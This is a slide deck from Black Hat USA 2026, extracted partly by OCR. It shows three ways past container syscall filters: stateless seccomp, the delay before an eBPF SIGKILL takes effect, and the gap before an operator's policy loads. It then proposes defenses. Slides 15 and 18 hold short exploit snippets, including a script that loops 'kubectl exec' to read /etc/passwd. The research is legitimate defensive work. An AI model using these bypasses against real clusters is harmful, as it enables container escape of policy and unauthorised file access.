---
title: "Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices"
speakers: ["Jin Her", "Chihyeon Cho", "Jaehyun Nam", "Seungsoo Lee"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Jin Her&Chihyeon Cho&Jaehyun Nam&Seungsoo Lee_Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices.pdf"
pages: 24
sha256: "f42b566cbbee32810c655a168c44d4ee08310dfeb77d9773faadc92207661f6a"
text_chars: 10150
ocr_pages: 4
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:10:25Z"
---
# Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices

**Speakers:** Jin Her, Chihyeon Cho, Jaehyun Nam, Seungsoo Lee  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Jin Her&Chihyeon Cho&Jaehyun Nam&Seungsoo Lee_Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices.pdf` (24 pages)


## Slide 1

# Beyond Seccomp: Breaking and Rebuilding Syscall Filtering for Microservices

Jin Her<sup>1</sup> , Chihyeon Cho<sup>1</sup> , Jaehyun Nam<sup>2</sup> , Seungsoo Lee<sup>1</sup> 1Incheon National University, 2Dankook University gjwls0787@inu.ac.kr, gsm07231@inu.ac.kr, namjh@dankook.ac.kr, seungsoo@inu.ac.kr

## Slide 2

## Speakers and Contributors

###### **Jin Her Chihyeon Cho Jaehyun Nam Seungsoo Lee (Speaker) (Speaker) (Contributor) (Contributor)**

- MS Student

   - MS Student

- •

- Incheon National Incheon National University University

###### **Research Focus Research Focus**

- •

- eBPF-based security confidential

- • computing container security

- Assistant Professor

- Dankook University

- asdfd

###### **Research Focus**

- networked systems security

- Associate Professor

- Incheon National University

###### **Research Focus**

   - Secure cloud

   - network systems

- •

- container security container security

2

## Slide 3

Contents 1. Introduction 2. Background 3. Vulnerability 4. Exploit 5. Defense

6. Conclusion 7. Q&A

3

## Slide 4

## Container Environment & Microservice

- Containers are the basic unit of microservices

- Unlike VMs, containers share the host kernel ✓ Syscall security becomes **critical** in container environment

VM VM
App App
Container Container
syscall() syscall()
Guest Kernel Guest Kernel App App
syscall()
Hypervisor Container Engine
Host Kernel Host Kernel
Infrastructure Infrastructure
< Virtualization > < Containerization >

4

## Slide 5

## Current Syscall Defense: Syscall Filtering

- One of the main approaches to syscall security

- limit the syscalls that a target can use

Container Container
App App
[ Syscall Policy ]
allowed  : Block Syscall
Container Engine syscall()
access,
close Syscall Filter
denied  :
Host Kernel Allow syscall
connect,
read
Infrastructure
…

5

## Slide 6

## Current Syscall Defense: Static Filter

- Seccomp-BPF as the dominant syscall blocking mechanism

- Static profile after container startup

   - ✓ no runtime policy update

   - ➢ motivates **dynamic enforcement**

Can’t update
Container
Seccomp
Profile App
Admin
User Space syscall()
Block  syscall()
Kernel Space
Syscall Interface with Error Return
Seccomp-BPF Program
Raw_tracepoint
Allow  syscall()
Actual Syscall Execution

6

## Slide 7

## Current Syscall Defense: Dynamic Filter

- eBPF enables programmable logic inside the kernel without kernel modification

- eBPF-based runtime enforcement stores policy state in eBPF maps → Policies can be updated during runtime

- If a violation is detected:

   - ✓ send a **SIGKILL signal** to terminate the process

Container
Admin
App
Update
User Space
syscall()
Kernel Space
Syscall Interface Send  SIGKILL
eBPF Maps
Seccomp-BPF Program
eBPF
raw_tracepoint
Programs
Actual Syscall Execution

7

## Slide 8

## Policy Application in Microservice

- Kubernetes orchestrates container deployment across distributed resources

- Operators are commonly used to apply workload-specific policies in Kubernetes

Container
Control Plane Container
Runtime
Informer Operator
: Policy Deployed
Container
eBPF Maps Policy
: Pod Deployed Identifier

8

## Slide 9

## Overview: Three Structural Blind Spots

Three structural blind spots :

- Seccomp-BPF → **Stateless filter**

- eBPF based enforcement → **Reactive Dely**

- Operator-based loading → **Asynchronous Policy Activation**

When applying a seccomp filter When applying an eBPF filter
Seccomp Profile
Kubernetes API
Container "defaultAction": ”scmp_act_errno",
"syscalls": [
App
"names": [
Operator Container
"read", "write", "open", …
syscall()
User Space
#3 #2
#1
Kernel Space
Seccomp-BPF eBPF Maps eBPF Programs

9

## Slide 10

## Blind Spot 1: Stateless Filtering

- Allowlist-based filters check syscalls independently

- Each syscall may be allowed in isolation

   - ➢ Sequential attacks using **allowed syscalls** cannot be blocked

Container
exploit payload connect to the C&C
Web Server
Attacker
Attacker C&C Server
[Allowlist] access() connect() close()
access(), close(),
connect() ,  read() ,
: normal flow getuid() socket() read()
socket(), getuid(),
: malicious flow …
Partial Runtime Syscall Flow
Seccomp Profile
⋮

10

## Slide 11

## Blind Spot 2: Reactive Delay

- SIGKILL does not always interrupt the syscall in progress

- For many syscalls, signal handling occurs on the **return path** (ex. write, sendto, kill, etc.)

   - ➢ Actual syscall execution may complete before group exit

Container
App
User Space
syscall()
Kernel Space
set flag
eBPF
raw_tracepoint
Programs
“task_struct”: {
group
Actual Syscall “signal”: { SIGNAL_GROUP_EXIT = 0 1 }}
exit
eBPF Maps
Execution
check flag
Return Loop
raw_tracepoint signal check return to user group exit

11

## Slide 12

### Blind Spot 3: Asynchronous Policy Activation

- Operator policy loading runs in parallel with container creation

- Policy state is installed **after pod events are observed**

   - ➢ Creates a security gap until policy activation

Control Plane Container Runtime Container Operator
Create Container
Start Container
Apply Pod
Manifest Activate
Policy Activation
Container
Policy
Gap ( ≒ 1sec)
Execution Time

12

## Slide 13

## Real-World Target Environment Setup

Experimental Environment **Category Configuration** Cluster **Kubernetes** v1.30.14, single-node Tetragon **v1.1.0** Runtime containerd v1.7.24 Kernel Linux v5.15 Attack Demo **Demo Blind Spot Environment Success Condition** Log4j chain succeeds with #1 Stateless filtering Kubernetes + Seccomp profile allowed syscalls Process killed, but write #2 Reactive delay Host-level eBPF test completed cat succeeds before policy #3 Initialization gap Kubernetes + Tetragon-1.4.0 activation

13

## Slide 14

## Demo 1: Evading Stateless Filters

• Stateless filter’s not sufficient to protect a container

14

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Demo 1: Evading Stateless Filters
* Stateless filter’s not sufficient to protect a container
¥ — @ 172.16.0.121:8080 = +
A\NotSecure 172.16.0.121:8080
GoFinance
The most popular peer to peer lending at SEA
Hello Again!
Back
Forgot Password ?
eee eclab@demo: ~/Demo/syscall_monitor
10: ~[Demo/syscalL_monitor (ssh) 31 x noni em i_monite
eclab@demo: ~/Demo/syscall_monitor (ssh)
cclab@demo:~/Demo/syscall_monitor$ sed -n '2063,2@83p' syscall_trace_cl
ean. log
cclab@demo:~/Demo/syscall_monitor$ head -n 3@ /var/lib/kubelet/sec
comp/profiles/web-server-profile. json]
oo
black hat
2026
14
```

## Slide 15

## Demo 2: Exploiting Delayed Termination

##### **enforcer.c**

##### **exploit.c**

15

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Demo 2: Exploiting Delayed Termination
enforcer.c
exploit.c
{
SEC("tracepoint/raw_syscalls/sys_enter")
int rtp_sys_enter(struct trace_event_raw_sys_enter xctx)
if (current_syscall != target_syscall)
return Q;
fd = (__s32)ctx->args [0];
if (!read_fd_basename(fd, actual_name) )
return Q;
if (!str_matches(target_name, actual_name) )
return Q;
bpf_send_signal(SIGKILL) ;
return @;
fd = open(argv[1], O_WRONLY | O_CREAT | O_TRUNC || 0_DIRECT,| 0600);
if (fd < @) {
perror("open");
return 1;
memset(buf, @, size);
strncpy(buf, argv[2], size - 1);
fprintf(stderr, "“[victim] writing %zu bytes to %s\n", size, argv[1]);
written = write(fd, buf, size);
if (written < @) {
perror("write");
} else {
fprintf(stderr, "“[victim] write returned %zd\n", written);
black hat
2026
15
```

## Slide 16

## Demo 2: Exploiting Delayed Termination

./exploit

16

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Demo 2: Exploiting Delayed Termination
root@nginx:/# §j
cclab@demo :~/Demo/2_sigkill6 [|
black hat
2026 16
```

## Slide 17

## Demo 3: Exploiting the Initialization Gap

##### **Tetragon policy**

- Applied Policy

   - SIGKILL at “sys_openat” hook point

**Tetragon policy**

17

## Slide 18

## Demo 3: Exploiting the Initialization Gap

exploit.sh

18

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Demo 3: Exploiting the Initialization Gap
exploit.sh
ame ‘siaboaane! pooner npermet (sh) °
#!/bin/bash cclab@demo:~/Demo/3_operator$ kubectl apply -f nginx. yaml [| =
NAMESPACE="default"
POD_NAME="nginx"
echo "[*] Spamming kubectl exec..."
while true; do
kubectl exec —n "$NAMESPACE" "$POD_NAME" —- \
cat /etc/passwd 2>/dev/null
‘cclab@demo: ~/Demo/3_operator (ssh)
EXIT_CODE=$? cclab@demo:~/Demo/3_operator$ ./exploit.sh ff
Ab
if [[ $EXIT_CODE -eq @ ]]; then
echo "[!!] Attack SUCCESS"
exit @
fi
done
black hat
2026 18
```

## Slide 19

## Defense : Stateful filtering

- Look up the **previous syscall** from the eBPF map

- Validate the syscall sequence using the syscall graph

- Detect invalid syscall sequences before enforcement

Container
App ( TID: 2 )
User Space
execve(59)
Kernel Space
eBPF
Previous Syscall Map
raw_tracepoint
Programs
Thread ID 1 2
Previous Syscall recvfrom(45) sched_yield ( 24 )
eBPF Maps
Syscall Graph Map
Container ID, Previous Syscall 2 , 24 1, 31
Allowed Syscalls sys_getitimer( 36 ) 24, 45

19

## Slide 20

## Defense : Preemptive Blocking

- SIGKILL response can be too late

- LSM-BPF blocks inline by returning an error at hook points

- But LSM hooks are not one-to-one syscall filters

execve(59) triggered  in  tid 2 LSM Hooks
raw_tracepoint return  Error
security_bprm_check_security()
eBPF eBPF
Programs Programs
Triggered Syscall Map
eBPF Maps
Thread ID 1 2
Triggered Syscall, Action recvfrom(45), allow execve( 59 ),  block

20

## Slide 21

## Defense : Atomic Policy Installation

- Requirements

   - Detect container creation events

   - **Prevent container startup** until policy installation completes

#### **OCI Prestart Hook**

𝑡0 𝑡1 𝑡2 𝑡3
Time
Kubernetes
Control Plane
Start Container / Execute EntrypointExecute Entrypoint
Container Runtime
Initialization Gap
• Create namespace • Initialization phase start
Conventional
• Create file system Install Policy Install Policy
O perator-basedCI Prestart Hook
Approach
• Populate  eBPF Map
• Populate  eBPF Map

21

## Slide 22

## Key Takeaways

- Three key limitations of current syscall filtering

- Design directions for next-generation syscall filtering

Stateless filtering Reactive Delay Initialization gap
eBPF-based
Inline preemptive Atomic policy
stateful syscall
blocking installation
filtering

22

## Slide 23

## Q&A

23

## Slide 24

## Acknowledgement

• This work was supported by the National Research Foundation of Korea(NRF) grant funded by the Korea government(MSIT)(No. RS-2025-16069415).

• This work was supported by the IITP(Institute of Information & Communications Technology Planning & Evaluation)-ICAN(ICT Challenge and Advanced Network of HRD) grant funded by the Korea government(Ministry of Science and ICT)(IITP-2026-RS-2024-00437024)

24
